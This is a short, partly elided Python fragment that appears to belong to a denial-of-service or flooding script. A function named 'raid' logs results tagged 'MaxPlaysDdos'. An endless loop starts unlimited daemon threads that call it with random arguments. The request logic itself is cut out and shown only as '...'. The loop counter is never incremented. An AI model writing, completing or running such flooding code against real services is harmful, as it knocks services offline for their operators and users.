...
def raid(a, b, c, vv:int):
    ...
    LogManager.info( f"{thr} === {out} === {vv + 1} === MaxPlaysDdos === {status}" )
        
i = 0        
while True:
    threading.Thread(target = raid, args = (random.choice(rand_list), random.choice(genders), random.choice(da_net), i), daemon = True).start()
